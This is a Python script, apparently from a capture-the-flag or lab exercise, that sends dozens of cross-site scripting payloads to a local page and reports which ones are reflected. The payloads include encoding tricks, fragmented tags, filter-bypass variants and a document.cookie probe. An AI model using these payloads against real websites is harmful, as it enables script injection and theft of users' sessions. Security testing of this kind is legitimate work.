import requests
import urllib.parse
import json
import re

# Target configuration
TARGET_URL = "http://127.0.0.1:32809/page"
PARAM_NAME = "solution"

def send_payload(payload):
    """Send payload to target and return response"""
    try:
        data = {PARAM_NAME: payload}
        response = requests.post(TARGET_URL, data=data, timeout=10)
        return {
            'payload': payload,
            'status': response.status_code,
            'content_length': len(response.content),
            'response_text': response.text,
            'reflected': True if payload in response.text else False,
            'filtered_text': None
        }
    except Exception as e:
        return {
            'payload': payload,
            'error': str(e),
            'reflected': False
        }

def analyze_filter_behavior(results):
    """Analyze which payloads work and identify filter patterns"""
    print("\n" + "="*80)
    print("XSS FILTER BEHAVIOR ANALYSIS")
    print("="*80)
    
    successful_payloads = []
    blocked_payloads = []
    partial_reflections = []
    
    for result in results:
        if 'error' in result:
            print(f"[!] Error sending payload: {result['error']}")
            continue
            
        payload = result['payload']
        reflected = result['reflected']
        status = result['status']
        
        if reflected and status == 200:
            successful_payloads.append(payload)
            print(f"[✓] FULLY REFLECTED: {payload[:60]}...")
        elif reflected and status != 200:
            partial_reflections.append((payload, status))
            print(f"[~] PARTIALLY REFLECTED (Status {status}): {payload[:60]}...")
        else:
            blocked_payloads.append(payload)
    
    print(f"\n[SUMMARY]")
    print(f"Total payloads tested: {len(results)}")
    print(f"Fully reflected: {len(successful_payloads)}")
    print(f"Blocked/filtered: {len(blocked_payloads)}")
    print(f"Partial reflections: {len(partial_reflections)}")
    
    if successful_payloads:
        print(f"\n[EXECUTABLE PAYLOADS FOUND]")
        print(f"These payloads are reflected in the response (potential XSS vectors):")
        for i, payload in enumerate(successful_payloads, 1):
            print(f"{i}. {payload}")
    
    return {
        'successful': successful_payloads,
        'blocked': blocked_payloads,
        'partial': partial_reflections
    }

def test_basic_tags():
    """Test basic script tag variations"""
    print("\n[TESTING BASIC SCRIPT TAGS]")
    payloads = [
        "<script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script>alert(document.domain)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>"
    ]
    return [send_payload(p) for p in payloads]

def test_event_handlers():
    """Test various event handler payloads"""
    print("\n[TESTING EVENT HANDLERS]")
    payloads = [
        '<img src=x onerror=alert("XSS")>',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<body onload=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<input autofocus onfocus=alert("XSS")>',
        '<iframe src=javascript:alert("XSS")>',
        '<video><source onerror=alert("XSS")>',
        '<audio src=x onerror=alert("XSS")>'
    ]
    return [send_payload(p) for p in payloads]

def test_encoded_payloads():
    """Test encoded payloads to bypass filters"""
    print("\n[TESTING ENCODED PAYLOADS]")
    
    payloads = []
    
    # URL encoded
    payloads.append("%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E")
    payloads.append("%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS%27)%3E")
    
    # Double URL encoded
    payloads.append("%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E")
    
    # HTML entity encoded (numeric)
    payloads.append("&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;")
    
    # HTML entity encoded (hex)
    payloads.append("&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;")
    
    # Mixed encoding
    payloads.append("%3Cscript%3Ealert(%26%2339%3BXSS%26%2339%3B)%3C%2Fscript%3E")
    
    # Unicode escape
    payloads.append("<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>")
    
    return [send_payload(p) for p in payloads]

def test_fragmented_payloads():
    """Test fragmented/polymorphic payloads"""
    print("\n[TESTING FRAGMENTED PAYLOADS]")
    payloads = [
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        "<s<script>cript>alert('XSS')</s<script>cript>",
        "<scr\nscript\npt>alert('XSS')</scr\nscript\npt>",
        "<'><script>alert('XSS')</script>",
        '"><script>alert("XSS")</script>',
        "</textarea><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>"
    ]
    return [send_payload(p) for p in payloads]

def test_alternative_syntax():
    """Test alternative JavaScript execution methods"""
    print("\n[TESTING ALTERNATIVE SYNTAX]")
    payloads = [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))>",
        "<svg/onload=\u0061\u006c\u0065\u0072\u0074('XSS')>",
        "<img/src=x/onerror=alert(String.fromCharCode(88,83,83))>",
        "<svg onload=alert`XSS`>"
    ]
    return [send_payload(p) for p in payloads]

def test_exotic_vectors():
    """Test exotic and less common XSS vectors"""
    print("\n[TESTING EXOTIC VECTORS]")
    payloads = [
        "<svg><script>alert('XSS')</script></svg>",
        "<math><mi/xlink:href=data:x,<script>alert('XSS')</script></mi></math>",
        "<marquee onstart='alert(\"XSS\")'>x</marquee>",
        "<embed src=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<isindex type=image src=1 onerror=alert('XSS')>",
        "<form><button formaction=javascript:alert('XSS')>",
        "<keygen onfocus=alert('XSS') autofocus>"
    ]
    return [send_payload(p) for p in payloads]

def test_waf_bypass_payloads():
    """Test specific WAF bypass payloads"""
    print("\n[TESTING WAF BYPASS PAYLOADS]")
    payloads = [
        "<svg/onrandom=random onload=confirm('XSS')>",
        "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
        "<svg onload=alert&Tab;(1)>",
        "<img src=x onerror=alert(1)//",
        "<svg/onload=alert`1`>",
        "<img/src=x/onerror=alert(1)>",
        "%3Csvg%20onload=alert(document.cookie)%3E",
        "<scr\u0069pt>alert('XSS')</scr\u0069pt>"
    ]
    return [send_payload(p) for p in payloads]

def main():
    """Main execution function"""
    print("="*80)
    print("XSS FILTER BEHAVIOR MAPPING SCRIPT")
    print(f"Target: {TARGET_URL}")
    print(f"Parameter: {PARAM_NAME}")
    print("="*80)
    
    all_results = []
    
    # Run all test categories
    all_results.extend(test_basic_tags())
    all_results.extend(test_event_handlers())
    all_results.extend(test_encoded_payloads())
    all_results.extend(test_fragmented_payloads())
    all_results.extend(test_alternative_syntax())
    all_results.extend(test_exotic_vectors())
    all_results.extend(test_waf_bypass_payloads())
    
    # Analyze results
    analysis = analyze_filter_behavior(all_results)
    
    # Identify filter patterns
    print("\n[FILTER PATTERN ANALYSIS]")
    print("="*80)
    
    if analysis['blocked']:
        print(f"\n[1] Likely filtering keywords:")
        blocked_keywords = ['script', 'onerror', 'onload', 'alert', 'javascript', 'src']
        found_patterns = []
        for keyword in blocked_keywords:
            for blocked in analysis['blocked']:
                if keyword.lower() in blocked.lower():
                    found_patterns.append(keyword)
                    break
        if found_patterns:
            print(f"   - Detected filters for: {', '.join(set(found_patterns))}")
        else:
            print("   - No obvious keyword patterns detected")
    
    if analysis['successful']:
        print(f"\n[2] Successfully reflected payloads found in {len(analysis['successful'])} cases")
        print("   These may be exploitable:")
        for payload in analysis['successful'][:5]:  # Show first 5
            if len(payload) > 70:
                print(f"   - {payload[:70]}...")
            else:
                print(f"   - {payload}")
    
    # Check for specific filter behaviors
    html_encoded_detected = any('&#60;' in r['payload'] for r in all_results if 'error' not in r)
    url_encoded_detected = any('%3C' in r['payload'] for r in all_results if 'error' not in r and r['reflected'])
    
    print(f"\n[3] Encoding handling:")
    print(f"   - HTML entity encoding detected: {'Yes' if html_encoded_detected else 'No'}")
    print(f"   - URL encoding bypass potential: {'Yes' if url_encoded_detected else 'No'}")
    
    # Check for case sensitivity
    case_variations = ['<script>', '<ScRiPt>', '<SCRIPT>']
    case_results = {p: False for p in case_variations}
    for result in all_results:
        for case_var in case_variations:
            if result['payload'].lower() == case_var.lower() and result['reflected']:
                case_results[case_var] = True
    
    print(f"\n[4] Case sensitivity:")
    for case_var, reflected in case_results.items():
        print(f"   - {case_var}: {'Reflected' if reflected else 'Blocked'}")
    
    print("\n" + "="*80)
    print("FILTER BEHAVIOR MAPPING COMPLETE")
    print("="*80)

if __name__ == "__main__":
    main()
